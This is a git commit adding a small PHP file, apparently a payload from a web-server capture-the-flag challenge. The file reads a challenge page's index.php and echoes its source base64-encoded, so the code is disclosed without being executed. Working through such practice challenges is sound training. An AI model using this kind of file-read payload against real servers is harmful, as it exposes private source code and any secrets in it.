f0b19fc31529de0a4f9b4a68d54389d6dec3e729
SFLegion <smeets.fabien@gmail.com>
2017-04-09 23:29:42 +0200

    Add files via upload

--- ok3_lang.php
+++ ok3_lang.php
@@ -1,5 +1,5 @@
 <?php 
 $myfile = fopen("/challenge/web-serveur/ch13/index.php", "r") or die("Unable to open file!");
-echo fread($myfile,filesize("/challenge/web-serveur/ch13/index.php"));
+echo base64_encode(fread($myfile,filesize("/challenge/web-serveur/ch13/index.php")));
 fclose($myfile);
 ?>
